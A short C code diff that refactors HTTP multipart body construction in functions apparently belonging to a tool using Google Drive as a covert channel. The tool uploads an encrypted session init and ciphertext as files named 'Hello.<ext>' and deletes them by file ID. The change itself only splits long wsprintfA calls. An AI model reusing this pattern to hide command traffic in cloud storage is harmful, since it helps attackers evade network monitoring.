@@ -148,7 +148,8 @@ BOOL DriveStart
 		SecureZeroMemory(lpBody, cbEncryptedSessionInit + 0x400);
 		wsprintfA(szName, "Hello.%s", pDriveConfig->lpStartExtension);
 		wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", szName);
-		cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, szName);
+		cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n", lpUniqueBoundary);
+		cbBody += wsprintfA(&lpBody[cbBody], "%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", szMetadata, lpUniqueBoundary, szName);
 		memcpy(&lpBody[cbBody], pEncryptedSessionInit, cbEncryptedSessionInit);
 		cbBody += cbEncryptedSessionInit;
 		cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
@@ -267,7 +268,8 @@ BOOL DriveSend
 		}
 
 		wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", szName);
-		cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, szName);
+		cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n", lpUniqueBoundary);
+		cbBody += wsprintfA(&lpBody[cbBody], "%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", szMetadata, lpUniqueBoundary, szName);
 		memcpy(&lpBody[cbBody], pCipherText->pBuffer, pCipherText->cbBuffer);
 		cbBody += pCipherText->cbBuffer;
 		cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
@@ -563,7 +565,7 @@ BOOL DriveDelete
 		goto CLEANUP;
 	}
 
-	wsprintfA(&szUri[lstrlenA(szUri)], "%s", lpFileId);
+	lstrcatA(szUri, lpFileId);
 	pUri = UriInit(szUri);
 	if (pUri == NULL) {
 		goto CLEANUP;
